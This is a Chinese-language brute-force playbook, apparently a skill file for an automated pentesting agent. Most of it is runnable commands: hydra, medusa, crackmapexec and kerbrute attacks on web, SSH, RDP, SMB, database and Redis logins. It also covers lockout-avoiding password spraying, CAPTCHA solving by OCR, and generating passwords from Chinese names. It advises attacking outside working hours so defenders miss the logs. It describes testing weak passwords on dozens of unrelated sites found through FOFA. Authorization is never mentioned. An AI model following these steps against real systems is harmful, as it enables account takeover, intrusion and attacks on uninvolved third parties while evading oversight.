---
description: 凭据爆破专项。覆盖 Web 登录/SSH/RDP/数据库/Redis/LDAP/SNMP 等各类服务的爆破策略。包含爆破决策树、字典选择、频率控制、锁定检测与处理、验证码识别。适用于需要获取初始访问或横向移动时的爆破场景。
---

# 凭据爆破

## 核心原则

==爆破不是盲目的——先判断值不值得爆，再选对字典和方法。爆错一次可能锁账号、封 IP、触发告警。==

> 前置: 目标信息收集参考 @recon.md（用户名格式/邮箱/组织信息用于定制字典）。爆破成功后横向移动参考 @post-exploit.md。Web 登录爆破通常从 @web-exploit.md 的漏洞利用流程进入。数据库爆破成功后敏感数据发现参考 @post-exploit.md 的 `reference/database-sensitive-discovery.md`。

## 爆破决策树

```
发现登录入口
  ├── 是否有已知用户名？（信息泄露/OSINT/枚举）
  │     ├── 有 → 针对性弱口令爆破（单个用户，少量密码）
  │     └── 无 → 先尝试用户名枚举，不成功再考虑
  │
  ├── 是否有锁定策略？
  │     ├── 不确定 → 先测试: 用不存在的用户名尝试 5 次，看是否返回"账户已锁定"
  │     ├── 有锁定 → 喷洒模式（一个密码 + 多个用户，错开时间窗口）
  │     └── 无锁定 → 可以密集爆破（但仍需限速避免触发 IDS）
  │
  ├── 是否有验证码？
  │     ├── 有 + 简单 → ddddocr 识别
  │     ├── 有 + 复杂 → 放弃爆破，换其他入口
  │     └── 无 → 直接爆破
  │
  ├── 什么服务？
  │     ├── Web 登录 → hydra/ffuf/burp intruder，注意 session/Cookie
  │     ├── SSH → hydra/medusa，极慢速（1-2 线程）
  │     ├── RDP → hydra/crowbar，极慢速 + 注意 Windows 锁定
  │     ├── SMB → crackmapexec（域环境优先）
  │     ├── 数据库 → hydra（MySQL/PostgreSQL/MSSQL/Oracle/MongoDB）
  │     ├── Redis → 无密码直接连，有密码用 hydra
  │     ├── LDAP → kerbrute（域用户枚举 + 密码喷洒）
  │     └── FTP → hydra，中速
  │
  └── 什么阶段？
        ├── 外围打点 → 只爆 Web 登录（其他服务不在外网）
        ├── 内网立足后 → 优先爆 SSH/数据库（密码复用率高）
        └── 横向移动 → 喷洒模式（一个密码 + 所有主机）
```

## 不该爆破的情况

```
以下情况放弃爆破，另找入口:
  1. 目标有明显 WAF + 频率限制 → 爆 3 次 IP 直接封
  2. 验证码无法用 ddddocr 识别（扭曲严重/背景复杂）
  3. 完全没有用户名线索 + 锁定策略未知 → 风险太高
  4. 目标只有一个入口且爆破可能导致全封锁 → 先挖漏洞，入口留到最后
  5. 云 WAF（阿里/腾讯）→ 连续请求 10+ 次即封禁，爆破成本太高
```

---

## 服务类型速查

### Web 登录表单

```bash
# 1. 先分析登录请求（Burp/curl 抓包确认参数名、错误信息）
curl -X POST "https://target.com/login" \
  -d "username=test&password=test" -v 2>&1 | grep -iE "error|fail|locked|wrong"

# 2. 判断是否有锁定
# 错误信息变化: "密码错误" → "账户已锁定" → 有锁定
# HTTP 状态码变化: 200 → 429/403 → 有频率限制
# 延迟变化: 正常 100ms → 突然 3000ms → 可能在限速

# 3. hydra（标准 HTTP POST 表单）
hydra -l <USERNAME> -P <WORDLIST> target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=密码错误" \
  -t 2 -w 3

# -t 2: 2 线程（Web 登录别超过 5）
# -w 3: 每次请求间隔 3 秒
# F=: 失败提示（不含此字符串 → 登录成功）

# 4. hydra（JSON API 登录）
hydra -l <USERNAME> -P <WORDLIST> target.com https-post-form \
  "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=\"code\":1" \
  -t 2 -w 2

# 5. ffuf（需要自定义 session/Cookie 时）
ffuf -u https://target.com/login \
  -d '{"username":"admin","password":"FUZZ"}' \
  -H "Content-Type: application/json" \
  -H "Cookie: JSESSIONID=xxx" \
  -w passwords.txt -fc 401 -t 2 -p 2
# -fc 401: 过滤掉认证失败的状态码
# -p 2: 每次请求延迟 2 秒

# 6. 如果登录返回 JWT/Set-Cookie → 判断成功与否
#    成功: 200 + Set-Cookie 包含 token/jwt
#    失败: 200 + JSON {"code":1,"msg":"密码错误"}
```

### 弱口令速战速决心法

==实战中最有效的不是 hydra 全量跑,而是分层策略——每一层的投入产出比递减,见好就收。==

```
第一层: admin:top1000（单个用户 + 精选密码）
  优先级最高，命中率最高。几乎所有系统都有 admin 账号。
  先拿 admin 试 top 500 密码 → 没中再加到 top 1000
  
第二层: usernameTOP10:passwordTOP100（多用户 + 少量密码）
  从 recon 收集的 10 个最可能的用户名 × 100 个最常见密码
  比单用户爆更深更有性价比——10×100=1000 次请求覆盖 10 个用户

第三层: 手机号 + top10 密码（国内专属）
  常用测试手机号: 13800138000, 13888888888, 13900000000, 
                   18888888888, 15000000000, 18900000000
  密码: 123456, admin123, password, 888888, 666666, 
        12345678, a123456, admin@123, 手机号后6位, 用户名+123

第四层: 草叉同步爆破（Burp Pitchfork 模式）
  不是笛卡尔积(username×password),而是按位置一一对应:
    username[1] : password[1]
    username[2] : password[2]
    ...
  适用场景: 已知多组用户名+推测对应密码(如中文姓名→拼音密码)
  优势: 请求量极小(username和password各100条=100次请求,而交叉爆破=10000次)
  设置: Burp Intruder → Attack type: Pitchfork → 两个 payload position
        分别加载 username.txt 和 password.txt(行数相同,一一对应)

第五层: 中文姓名密码生成（详见下方「优先级4」）

第六层: 同系统交叉测试（详见下方「优先级5」）
```

### SSH

```bash
# 极慢速，1-2 线程。SSH 爆破是最容易被检测的。

# hydra
hydra -l <USERNAME> -P <WORDLIST> ssh://<TARGET> -t 1 -w 5
# -t 1: 单线程
# -w 5: 每次间隔 5 秒

# medusa（比 hydra 更稳定）
medusa -h <TARGET> -u <USERNAME> -P <WORDLIST> -M ssh -t 1
```

### RDP

```bash
# Windows 账户锁定策略严格，RDP 爆破必须极慢

# hydra
hydra -l <USERNAME> -P <WORDLIST> rdp://<TARGET> -t 1 -w 10
# -w 10: 每次间隔 10 秒（默认 Windows 5 次失败锁定 30 分钟）

# crowbar（RDP 专用，更稳定）
crowbar -b rdp -s <TARGET>/32 -u <USERNAME> -C <WORDLIST>
```

### SMB（域环境优先）

```bash
# crackmapexec（域环境密码喷洒首选）
crackmapexec smb <TARGET_RANGE> -u <USERNAME> -p <PASSWORD>
crackmapexec smb <TARGET_RANGE> -u users.txt -p passwords.txt --no-bruteforce
# --no-bruteforce: 一一对应，不交叉爆破
# --continue-on-success: 成功后继续（找更多可登录的主机）

# crackmapexec（pass-the-hash，不是爆破但相关）
crackmapexec smb <TARGET_RANGE> -u <USERNAME> -H <NTLM_HASH>

# 域用户枚举（配合 kerbrute）
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt
```

### Kerberos 密码喷洒

```bash
# 域环境密码喷洒：一个密码 + 所有用户（避免锁定）
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>'

# 或 crackmapexec
crackmapexec smb <TARGET_RANGE> -u users.txt -p '<PASSWORD>' --no-bruteforce

# 喷洒策略:
# 1. 先试季节+年份: Spring2024 / Summer2024 / Autumn2024 / Winter2024
# 2. 公司名+数字: Company123 / Company2024
# 3. 默认密码: P@ssw0rd / Password123
# 每次尝试间隔 30 分钟以上（AD 默认锁定策略 30 分钟重置）
```

### 数据库

```bash
# MySQL
hydra -l <USERNAME> -P <WORDLIST> mysql://<TARGET> -t 4 -w 1

# PostgreSQL
hydra -l <USERNAME> -P <WORDLIST> postgresql://<TARGET> -t 4 -w 1

# MSSQL
hydra -l <USERNAME> -P <WORDLIST> mssql://<TARGET> -t 4

# Oracle（注意 SID）
hydra -l <USERNAME> -P <WORDLIST> oracle://<TARGET>/ORCL -t 4

# MongoDB（常见无密码）
mongo <TARGET>:27017
# 如果有密码:
hydra -l <USERNAME> -P <WORDLIST> mongodb://<TARGET> -t 4

# Redis（常见无密码）
redis-cli -h <TARGET>
> AUTH <PASSWORD>
# 批量 Redis 密码测试:
for pw in $(cat passwords.txt); do
  echo "AUTH $pw" | redis-cli -h <TARGET> 2>/dev/null | grep -q OK && echo "[+] Found: $pw"
done
```

### 其他服务

```bash
# FTP
hydra -l <USERNAME> -P <WORDLIST> ftp://<TARGET> -t 4

# LDAP
hydra -l <USERNAME> -P <WORDLIST> ldap://<TARGET> -t 4

# SNMP community string
onesixtyone -c community.txt <TARGET>

# VNC
hydra -P <WORDLIST> vnc://<TARGET> -t 1 -w 2
```

---

## 字典策略

### 优先级 1：定制字典（基于目标信息）

```
从 @recon.md 的信息收集中提取:
  1. 公司名/域名 → 生成变体
     公司名: AcmeTech → AcmeTech123 / AcmeTech2024 / acmetech / ACMETECH
     域名: target.com → target / Target2024

  2. 产品名/服务名
     OA 系统名 → xinhu / fanwei / yonyou

  3. 已知用户名 → 生成密码
     zhangsan → zs123456 / zhangsan123 / zhangsan@2024

  4. 已知密码规则 → 按规则生成
     看到内部通知"新密码8-16位含大小写+数字"
     → 用 crunch/hashcat rule 生成

生成工具:
  hashcat --stdout -r /usr/share/hashcat/rules/best64.rule custom_base.txt > generated.txt
  crunch 8 16 -t "Target%%%@" -o generated.txt  # Target + 3位数字 + 1个特殊字符
```

### 优先级 2：场景化弱口令

```
业务系统弱口令（国内常见）:
  admin/admin, admin/123456, admin/admin888, admin/admin123
  admin/password, admin/admin@123, admin/Admin@123
  system/system, system/123456
  sa/sa, sa/123456 (MSSQL)

OA/ERP 系统默认密码:
  admin/123456, admin/admin, admin/888888
  system/123456, sys/123456
  root/root, root/123456, root/admin

SSH/RDP 弱口令:
  root/root, root/admin, root/123456, root/toor
  Administrator/123456, Administrator/P@ssw0rd
  admin/admin, admin/123456
  ubuntu/ubuntu, pi/raspberry

数据库弱口令:
  root/root, root/admin, root/123456, root/mysql (MySQL)
  sa/sa, sa/123456, sa/P@ssw0rd (MSSQL)
  postgres/postgres, postgres/123456 (PostgreSQL)
```

### 优先级 3：通用字典

```
默认使用:
  Kali: /usr/share/wordlists/rockyou.txt (1400 万，太大)
  精选: top 100 / top 1000 / top 10000

按场景精选后再用，不要直接扔 rockyou 全量:
  - Web 登录: top 500，避免锁定
  - SSH: top 100
  - 数据库: top 1000（一般没有锁定策略）
  - 密码喷洒: 10-20 个季节+年份组合

提取 top N:
  head -n 100 /usr/share/wordlists/rockyou.txt > top100.txt
```

### 优先级 4：中文姓名密码生成

==国内目标,从 recon 收集到的中文姓名生成拼音/简拼变体密码。出洞率极高,是实战中除 admin:top1000 外最高收益的字典。==

```
姓名来源优先级:
  1. 网页底部版权: "© 2024 张三" → username=zhangsan
  2. JS 中注释/作者: @author lisi → username=lisi
  3. 邮箱前缀: wangwu@target.com → wangwu
  4. Whois/ICP 备案联系人
  5. 天眼查/企查查法人/高管姓名

从中文姓名生成密码变体:

  # 姓名: 张三
  拼音全拼:  zhangsan, zs123456, zhangsan123, zhangsan@2024
  简拼:     zs123, zs123456, zs12345678
  全拼+年份: zhangsan2024, zhangsan2025, zhangsan2026
  全拼+特殊: zhangsan@123, zhangsan#123, zhangsan!
  简拼+年份: zs2024, zs2025
  简拼+公司: zs@companyname
  
  # 姓名: 王五（双字名）
  拼音全拼:  wangwu, ww123456, wangwu123
  简拼:     ww123, ww123456
  逆序:     wuwang, wangw
  
  # 姓名: 欧阳锋（复姓+单名）
  拼音全拼:  ouyangfeng, oyf123456
  简拼:     oyf123, oyf123456

自动生成脚本:
  # 输入: 中文姓名(空格分隔姓和名)
  # 输出: 密码变体列表
  
  python3 -c "
  from pypinyin import lazy_pinyin, Style
  import sys
  
  name = sys.argv[1] if len(sys.argv) > 1 else '张三'
  # 全拼
  qp = ''.join(lazy_pinyin(name))
  # 简拼(首字母)
  jp = ''.join([x[0] for x in lazy_pinyin(name)])
  # 姓全拼+名全拼
  x = lazy_pinyin(name[:1])[0]
  m = ''.join(lazy_pinyin(name[1:]))
  
  years = ['2024','2025','2026','123','123456','12345678']
  specials = ['@123','#123','@2024','@2025','!','@','#']
  
  passwords = set()
  # 全拼变体
  passwords.update([qp, qp+'123', qp+'123456', x+m, x+m+'123'])
  # 简拼变体
  passwords.update([jp, jp+'123', jp+'123456'])
  # 年份组合
  for y in years:
      passwords.update([qp+y, jp+y, x+m+y])
  # 特殊字符
  for s in specials:
      passwords.update([qp+s, jp+s, x+m+s])
  # 逆序
  passwords.add(x+m[::-1])
  passwords.add(qp[::-1])
  
  print('\n'.join(passwords))
  " "张三" > name_passwords.txt
  
  # 批量: 每行一个中文姓名
  while read name; do
    python3 -c "..." "$name" >> all_names.txt
  done < chinese_names.txt
```

### 优先级 5：同系统交叉测试

==一套系统在这个站没弱口令,FOFA/测绘搜同指纹系统,拿别的站的弱口令回来打这个站。==

```
流程:
1. 从目标提取指纹:
   - 响应体特征: "Powered by XXX" / 特有的 JS 文件名 / 默认 favicon hash
   - 响应头: Server / X-Powered-By / Set-Cookie 的 path/name
   - 页面结构: 特定 CSS class / HTML title / 版权信息
   
2. FOFA 搜索同系统:
   - body="Powered by XXX系统" && country="CN"
   - header="X-Powered-By: XXX" && region="广东"
   - favicon="hash" && status_code=200
   
3. 对同系统站点批量测试弱口令:
   - 从 FOFA 结果中选 20-50 个不重复站点
   - admin:top100 快速过一遍
   - 找到任意一个站有 admin/123456 → 记录
   
4. 回打原始目标:
   - 用同系统的弱口令尝试原始目标
   - 即使原始目标改了默认密码,同系统中的常见密码也有参考价值
   - 进后台后观察鉴权机制 → 如果同系统鉴权一致 → 通杀漏洞

5. 通杀升级:
   - 找到一个同系统站的漏洞后,立即对 FOFA 搜出的所有站点复测
   - 这比在单个目标上深挖效率高 10 倍
```

---

## 频率控制

| 服务 | 线程数 | 请求间隔 | 原因 |
|------|--------|---------|------|
| Web 登录(无 WAF) | 2-5 | 1-3s | 避免触发应用层频率限制 |
| Web 登录(有 WAF) | 1 | 3-5s | 云 WAF 对连续请求敏感 |
| SSH | 1 | 5s | 最敏感的协议，auth.log 全记录 |
| RDP | 1 | 10s | Windows 默认 5 次失败锁定 30 分钟 |
| SMB(喷洒) | 1 | 30s+ | 域环境，需错开时间窗口 |
| MySQL/PostgreSQL | 4 | 1s | 一般无锁定策略 |
| Redis | 8 | 0s | 很少有限制 |
| FTP | 4 | 1s | 一般无频率限制 |

```
通用规则:
  1. 不知道有没有锁定 → 先 1 线程跑 5 次试试
  2. 外网目标 → 降低一档（IDC 层面可能有限制）
  3. 内网目标 → 可以适当加快（内网监控相对少）
  4. 生产时间 → 避开 9:00-18:00（日志有人看）
```

---

## 账户锁定处理

```
锁定检测:
  1. HTTP 响应中出现 "locked" / "disabled" / "blocked" / "冻结"
  2. HTTP 状态码: 423 Locked
  3. 响应时间突变（正常 100ms → 突然 5000ms）
  4. LDAP 返回: 0x775 (ERROR_ACCOUNT_LOCKED_OUT)

锁定后的策略:
  1. 等待解锁再继续
     - AD 默认 30 分钟 → 等 35 分钟后继续
     - Web 应用 → 看返回信息中是否有倒计时
  2. 换用户
     - 知道多个用户名 → 轮流爆，每个用户不超过 4 次
  3. 密码喷洒（绕过锁定）
     - 一个密码 + 所有用户 → 锁定阈值始终不被触发
     - 间隔 30 分钟 + 换密码 → 重复
  4. 放弃
     - 只有一个用户 + 锁定策略严格 → 换其他入口
```

---

## 验证码处理

> 本章从爆破视角覆盖 OCR 识别和频率控制。验证码本身的逻辑漏洞（可绕过/不失效/炸弹/泄露/越权等）见 @web-exploit.md 的 `reference/captcha-bypass.md`（图形验证码 6 种 + 短信验证码 7 种漏洞 + 6 种炸弹绕过技巧 + 任意密码重置）。

```
验证码分析:
  1. 简单数字/字母（无干扰） → ddddocr 直接识别
  2. 带干扰线/噪点 → ddddocr + 预处理（灰度/二值化）
  3. 滑块/点击/旋转 → 放弃爆破，太复杂
  4. 第三方服务（极验/顶象） → 极难，放弃

ddddocr 使用（Kali 环境）:
  python3 -c "
  import ddddocr
  import requests

  ocr = ddddocr.DdddOcr()
  # 下载验证码图片
  img = requests.get('https://target.com/captcha', headers={'Cookie': session}).content
  result = ocr.classification(img)
  print(result)
  "

带验证码的爆破流程:
  while 未锁定 and 还有密码:
    1. GET 验证码图片 → ddddocr 识别
    2. POST 登录（用户名 + 密码 + 验证码）
    3. 如果返回"验证码错误" → 重新识别（不是密码错误）
    4. 如果连续 3 次验证码错误 → OCR 不准，放弃或人工介入
```

---

## 常用工具速查

| 工具 | 用途 | 特点 |
|------|------|------|
| hydra | 通用爆破（HTTP/SSH/RDP/DB/FTP/...） | 覆盖面最广 |
| medusa | 通用爆破 | 比 hydra 更稳定，某些协议更快 |
| crackmapexec | SMB/WinRM/MSSQL 域环境 | 域渗透首选，支持 PTH |
| kerbrute | Kerberos 用户枚举 + 密码喷洒 | AD 环境专用 |
| ffuf | Web 表单/API 爆破 | 灵活，支持自定义 header |
| crowbar | RDP/VNC/OpenVPN | RDP 更稳定 |
| onesixtyone | SNMP community 爆破 | SNMP 专用 |
| ddddocr | 验证码 OCR | 简单验证码自动识别 |
| crunch | 字典生成 | 按规则生成密码 |
| hashcat | 字典生成 + hash 破解 | rule 模式生成高度定制字典 |

---

## 走不通时

```
爆破全失败？
├── 换个用户名（换个格式、换大小写、换拼音/英文名）
├── 换入口（同一个系统可能有多个登录页面/端口）
├── 放弃爆破 → 找其他漏洞
│     ├── 密码重置漏洞（任意用户密码重置）
│     ├── 注册新用户（默认是否有更高权限）
│     ├── 未授权访问（绕过登录）
│     ├── 源码/配置文件泄露（读数据库密码直接连）
│     └── SSRF/XXE/RCE（直接拿服务器权限）
└── 爆破仍然是唯一选择 → 重写字典（从目标网站内容、产品名、组织架构定制）
```

## 知识库路由

| 场景 | KB 路径 | 关键内容 |
|------|---------|---------|
| 爆破工具使用 | `06-工具与命令/爆破工具&字典/` | hydra/medusa/crackmapexec 详细用法 |
| 字典生成 | `06-工具与命令/爆破工具&字典/` | 各场景字典模板 |
| 验证码绕过 | `11-实战经验/验证码识别与爆破.md` | ddddocr + 实战案例 |
| 域密码喷洒 | `04-后渗透/域渗透/` | kerbrute + crackmapexec 域环境 |